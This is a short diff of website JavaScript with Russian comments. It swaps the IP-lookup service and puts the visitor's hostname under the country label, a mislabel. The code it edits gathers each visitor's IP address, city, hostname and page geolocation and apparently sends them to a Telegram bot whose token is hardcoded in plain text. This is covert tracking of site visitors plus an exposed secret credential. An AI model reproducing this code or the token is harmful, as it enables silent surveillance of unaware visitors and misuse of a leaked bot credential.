@@ -1,9 +1,9 @@
 async function getIPInfo() {
-  const response = await fetch("https://ipapi.co/json/");
+  const response = await fetch("https://ipinfo.io/json");
   const data = await response.json();
   const location = await document.getElementById("location-info").textContent;
   console.log("IP-адрес:", data.ip);
-  console.log("Страна:", data.country_name);
+  console.log("Страна:", data.hostname);
   console.log("Город:", data.city);
   console.log("Геолокация:", location);
         const BOT_TOKEN = '8178967594:AAE14G4kmVksV-Y3oyZNBQkxe98JDYQgzws'; // Токен бота
@@ -11,7 +11,7 @@ async function getIPInfo() {
         const TEXT = `
           iDONi тебе сообщение из web-сайта iDONi:
           IP-адрес: ${data.ip}
-          Стра: ${data.country_name}
+          Стра: ${data.hostname}
           Город: ${data.city}
           Геолокация: ${location}
         `;
